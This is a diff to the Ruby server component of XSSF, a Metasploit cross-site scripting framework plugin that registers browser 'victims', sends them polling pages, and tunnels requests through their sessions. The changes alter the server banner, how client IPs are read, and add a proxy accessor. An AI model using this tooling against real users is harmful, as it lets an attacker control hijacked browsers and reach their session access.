@@ -3,18 +3,14 @@ require 'rex/ui'
 require 'uri'
 require 'webrick'
 require 'base64'
-
-
-#
-# This module implements a HTTP Server used for the new XSSF plugin.
-#
+  
 module Msf
 	module Xssf
 		module XssfMaster
 			include Msf::Xssf::XssfDatabase
 			include Msf::Xssf::XssfTunnel
 			include Msf::Xssf::XssfGui
-	
+  
 			#
 			# Starts the server
 			#
@@ -27,15 +23,15 @@ module Msf
 					:Port				=> port,
 					:Logger				=> WEBrick::Log.new(Logger.new($stdout), WEBrick::Log::FATAL),
 					:AccessLog			=> [[ WEBrick::Log.new(Logger.new($stdout), WEBrick::Log::FATAL), WEBrick::AccessLog::COMBINED_LOG_FORMAT ]],
-					:ServerSoftware 	=> "WEBrick (Ruby)",
+					:ServerSoftware 	=> "XSSF " + XSSF_VERSION,
 					:ServerType 		=> Thread,
 					:MaxClients     	=> 1000,
 					:DoNotReverseLookup => true
 				)
-
+				# self.server.mount('/resources/',  HTTPServlet::FileHandler, INCLUDED_FILES)
 				self.server.mount_proc("#{uri}") { |req, res| xssf_process_request(req, res) }	# Listening connections to URI
 				self.server.start
-
+  
 				return false if not register_server(self.serverHost, port, uri)				
 
 				# Check in background for active victims !
@@ -58,7 +54,7 @@ module Msf
 				begin
 					if ((req.unparsed_uri.to_s =~ /^http:\/\/.*$/) && (req.host != self.serverHost))	# Request done in Tunnel mode
 						if ((victim_tunneled && (req.request_method =~ /^(GET|POST)$/i)) && 
-							((req.remote_ip == self.serverHost) or (req.remote_ip == "localhost") or (req.remote_ip == "127.0.0.1") or XSSF_FROM_OUTSIDE[0]) )
+							((req.peeraddr[3] == self.serverHost) or (req.peeraddr[3] == "localhost") or (req.peeraddr[3] == "127.0.0.1") or XSSF_FROM_OUTSIDE[0]) )
 							xssf_tunnel_request(req, res, victim_tunneled)
 						else
 							XSSF_404(res)
@@ -88,9 +84,9 @@ module Msf
 					# Page asked is the victim loop page : Send loop page to the victim if correctly saved in the database
 					when /^#{self.serverURI + VICTIM_LOOP}/
 						if (id)
-							get_victim(id) ? update_victim(id, "Unknown", interval.to_i) : (id = add_victim(req.remote_ip, interval.to_i, req.header['user-agent'][0].downcase))
+							get_victim(id) ? update_victim(id, "Unknown", interval.to_i) : (id = add_victim(req.peeraddr[3], interval.to_i, req.header['user-agent'][0].downcase))
 						else
-							id = add_victim(req.remote_ip, interval.to_i, req.header['user-agent'][0].downcase)
+							id = add_victim(req.peeraddr[3], interval.to_i, req.header['user-agent'][0].downcase)
 						end
 						
 						if (id)
@@ -222,7 +218,7 @@ module Msf
 				file_name = INCLUDED_FILES + Rex::Text.to_hex_ascii(req.unparsed_uri)
 				
 				if (File.exist?(file_name) and (Rex::Text.to_hex_ascii(req.unparsed_uri) != '/'))			# If file is known, server sends it directly to the victim, if not, asking to the module !
-					if (((file_name =~ /#{XSSF_GUI_FILES}/i) or (file_name =~ /#{XSSF_LOG_FILES}/i)) and not ((req.remote_ip == self.serverHost) or XSSF_FROM_OUTSIDE[0]))
+					if (((file_name =~ /#{XSSF_GUI_FILES}/i) or (file_name =~ /#{XSSF_LOG_FILES}/i)) and not ((req.peeraddr[3] == self.serverHost) or XSSF_FROM_OUTSIDE[0]))
 						XSSF_404(res)
 					else
 						XSSF_RESP(res, add_xssf_post(File.open(file_name, "rb") {|io| io.read }, id, req.host), 200, "OK", {'Content-type' => (File.extname(file_name) == '.html') ? 'text/html' : 'application/octet-steam'})
@@ -237,7 +233,7 @@ module Msf
 			end
 			
 		protected
-			attr_accessor :server, :serverURI, :serverPort, :serverHost
+			attr_accessor :server, :serverURI, :serverPort, :serverHost, :proxy
 			
 			#
 			# Sends XSSF 404 page
